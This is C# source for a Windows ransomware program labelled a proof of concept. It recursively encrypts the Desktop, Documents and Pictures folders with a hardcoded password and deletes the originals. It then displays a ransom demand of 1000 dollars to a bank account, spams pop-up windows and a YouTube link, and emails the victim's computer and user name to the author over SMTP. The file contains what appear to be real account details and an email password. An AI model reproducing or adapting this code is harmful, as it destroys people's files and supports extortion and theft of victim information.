using System;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using System.Diagnostics;
using WindowsFormsApp1;

namespace RansomwarePOC
{
    public partial class Form1 : Form
    {
        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //

        private const bool DELETE_ALL_ORIGINALS = true; /* CAUTION */
        private const bool ENCRYPT_DESKTOP = true;
        private const bool ENCRYPT_DOCUMENTS = true;
        private const bool ENCRYPT_PICTURES = true;
        private const string ENCRYPTED_FILE_EXTENSION = ".prd";
        //private const string ENCRYPT_PASSWORD = "Password1";
        private const string ENCRYPT_PASSWORD = "ABCxyz123";
        //private const string BITCOIN_ADDRESS = "1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1";
        private const string BITCOIN_ADDRESS = "19036564054017, Techcombank, Nguyen Duy Hoan";
        //private const string EMAIL_ADDRESS = "this.email.address@gmail.com";
        private const string EMAIL_ADDRESS = "2051120235@ut.edu.vn";

        // ----------------------------- END -------------------------------- //




        private static string ENCRYPTION_LOG = "";
        private string RANSOM_LETTER =
           "All of your files have been encrypted.\n\n" +
           "To unlock them, please send your money to this bank account address: " + BITCOIN_ADDRESS + "\n" +
           "Afterwards, please email your transaction ID to: " + EMAIL_ADDRESS + "\n\n" +
           "Thank you and have a nice day!\n\n" +
           "Encryption Log:\n" +
           "----------------------------------------\n";
        private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static int encryptedFileCount = 0;

        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //

        private const bool DELETE_ENCRYPTED_FILE = true; /* CAUTION */
        private const bool DECRYPT_DESKTOP = true;
        private const bool DECRYPT_DOCUMENTS = true;
        private const bool DECRYPT_PICTURES = true;

        // ----------------------------- END -------------------------------- //

        private static string DECRYPTION_LOG = "";
        private static int decryptedFileCount = 0;
        private bool stopSpam = false;

        public Form1()
        {
            InitializeComponent();

            SendMailFromVictim();

            Timer tmr = new Timer();
            tmr.Interval = 10000;
            tmr.Tick += Tmr_Tick;
            tmr.Start();

            Timer tmr2 = new Timer();
            tmr2.Interval = 5000;
            tmr2.Tick += Tmr_Tick2;
            tmr2.Start();

            //GeneratePassword(ENCRYPT_PASSWORD);
        }

        private void Tmr_Tick(object sender, EventArgs e)
        {
            if (stopSpam == false)
                Process.Start("https://youtu.be/_UcFKFYsJ-E");
        }

        private void Tmr_Tick2(object sender, EventArgs e)
        {
            SpamForm1 sf1 = new SpamForm1();

            if (stopSpam == false)
                sf1.Show();
        }

        /*public void GeneratePassword(string pass)
        {
            Random rd = new Random();
            int rand_num = rd.Next(100000, 999999);

            pass = rand_num.ToString();
        }*/

        private void Form1_Load(object sender, EventArgs e)
        {
            initializeForm();

            if (ENCRYPT_DESKTOP)
            {
                encryptFolderContents(DESKTOP_FOLDER);
            }

            if (ENCRYPT_PICTURES)
            {
                encryptFolderContents(PICTURES_FOLDER);
            }

            if (ENCRYPT_DOCUMENTS)
            {
                encryptFolderContents(DOCUMENTS_FOLDER);
            }

            if (encryptedFileCount > 0)
            {
                formatFormPostEncryption();
                //dropRansomLetter();
            }
            else
            {
                //Console.Out.WriteLine("No files to encrypt.");
                //Application.Exit();
                formatFormPostEncryption();
            }
        }

        private void dropRansomLetter()
        {
            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___RECOVER__FILES__" + ENCRYPTED_FILE_EXTENSION + ".txt");
            ransomWriter.WriteLine(RANSOM_LETTER);
            ransomWriter.WriteLine(ENCRYPTION_LOG);
            ransomWriter.Close();
        }

        private void formatFormPostEncryption()
        {
            this.Opacity = 100;
            this.WindowState = FormWindowState.Maximized;
            lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
        }

        private void initializeForm()
        {
            this.Opacity = 0;
            this.ShowInTaskbar = false;
            //this.WindowState = FormWindowState.Maximized;
            lblBitcoinAmount.Text = "To unlock them, please send 1000 dollars to this bank account address:";
            txtBitcoinAddress.Text = BITCOIN_ADDRESS;
            txtEmailAddress.Text = EMAIL_ADDRESS;
            lblBitcoinAmount.Focus();
        }

        static void encryptFolderContents(string sDir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION)) {
                        Console.Out.WriteLine("Encrypting: " + f);
                        FileEncrypt(f, ENCRYPT_PASSWORD);
                    }
                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    encryptFolderContents(d);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private static void FileEncrypt(string inputFile, string password)
        {
            //http://stackoverflow.com/questions/27645527/aes-encryption-on-large-files
            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
            AES.Mode = CipherMode.CBC;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    //Application.DoEvents(); // -> for responsive GUI, using Task will be better!
                    cs.Write(buffer, 0, read);
                }

                // Close up
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                ENCRYPTION_LOG += inputFile + "\n";
                encryptedFileCount++;
                cs.Close();
                fsCrypt.Close();
                if (DELETE_ALL_ORIGINALS)
                {
                    File.Delete(inputFile);
                }
            }
        }

        /*private static void FileDecrypt(string inputFile, string outputFile, string password)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream cryptoFileStream = new FileStream(inputFile, FileMode.Open);
            cryptoFileStream.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CBC;

            CryptoStream cryptoStream = new CryptoStream(cryptoFileStream, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    //Application.DoEvents();
                    fileStreamOutput.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cryptoStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fileStreamOutput.Close();
                cryptoFileStream.Close();
            }
        }*/

        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    // Fille the buffer with the generated data
                    rng.GetBytes(data);
                }
            }

            return data;
        }

        private void ConfirmButton_Click(object sender, EventArgs e)
        {
            if (PasswordTextBox.Text == ENCRYPT_PASSWORD)
            {
                stopSpam = true;

                SpamForm1.stopSpamPic = true;

                DecrypterPOC();

                string message = "Thanks for your money and have a good day!";
                string title = "Release successful!";
                MessageBoxButtons buttons = MessageBoxButtons.OK;
                DialogResult result = MessageBox.Show(message, title, buttons);

                if (result == DialogResult.OK)
                {
                    this.Close();
                    Application.Exit();
                }
                else
                {
                    this.Close();
                    Application.Exit();
                }
            }
            else
            {
                string message = "Password incorrect";
                string title = "Error";
                MessageBoxButtons buttons = MessageBoxButtons.OK;
                DialogResult result = MessageBox.Show(message, title, buttons);

                if (result == DialogResult.OK)
                {
                    
                }
                else
                {
                    
                }
            }
        }

        public void DecrypterPOC()
        {
            if (DECRYPT_DESKTOP)
            {
                decryptFolderContents(DESKTOP_FOLDER);
            }

            if (DECRYPT_PICTURES)
            {
                decryptFolderContents(PICTURES_FOLDER);
            }

            if (DECRYPT_DOCUMENTS)
            {
                decryptFolderContents(DOCUMENTS_FOLDER);
            }

            if (decryptedFileCount > 0)
            {
                dropDecryptionLog();
            }
            else
            {
                Console.Out.WriteLine("No files to encrypt.");
            }
        }

        private void dropDecryptionLog()
        {
            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___DECRYPTION_LOG.txt");
            ransomWriter.WriteLine(decryptedFileCount + " files have been decrypted." +
                "\n----------------------------------------\n" +
                DECRYPTION_LOG);
            ransomWriter.Close();
        }

        private static bool fileIsEncrypted(string inputFile)
        {
            if (inputFile.Contains(ENCRYPTED_FILE_EXTENSION))
                if (inputFile.Substring(inputFile.Length - ENCRYPTED_FILE_EXTENSION.Length, ENCRYPTED_FILE_EXTENSION.Length) == ENCRYPTED_FILE_EXTENSION)
                    return true;
            return false;
        }

        static void decryptFolderContents(string sDir)
        {
            try
            {
                foreach (string file in Directory.GetFiles(sDir))
                {
                    if (fileIsEncrypted(file))
                    {
                        FileDecrypt2(file, file.Substring(0, file.Length - ENCRYPTED_FILE_EXTENSION.Length), ENCRYPT_PASSWORD);
                    }
                }

                foreach (string directory in Directory.GetDirectories(sDir))
                {
                    decryptFolderContents(directory);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private static void FileDecrypt2(string inputFile, string outputFile, string password)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CBC;

            CryptoStream cryptoStream = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    //Application.DoEvents();
                    fileStreamOutput.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cryptoStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fileStreamOutput.Close();
                fsCrypt.Close();
                if (DELETE_ENCRYPTED_FILE)
                    File.Delete(inputFile);
                DECRYPTION_LOG += inputFile + "\n";
                decryptedFileCount++;
            }
        }

        public void SendMailFromVictim()
        {
            string ComputerName = Environment.MachineName;
            string UserName = Environment.UserName;
            string DateName = DateTime.Now.ToLongDateString();
            string TimeName = DateTime.Now.ToLongTimeString();

            string subject = "From PRD victim (" + ComputerName + ", " + UserName + ")";
            string body = "Victim info:\nComputer name: " + ComputerName + "\n" + "User name: " + UserName + "\nDate time become victim: " + DateName + " at " + TimeName;

            MailMessage mess = new MailMessage();

            mess.From = new MailAddress("2051120235@ut.edu.vn");
            mess.Subject = subject;
            mess.Body = body;

            mess.To.Add(new MailAddress("2051120235@ut.edu.vn"));

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);

            client.EnableSsl = true;

            client.Credentials = new NetworkCredential("2051120235@ut.edu.vn", "01677607954Hoan");

            client.Send(mess);
        }
    }
}
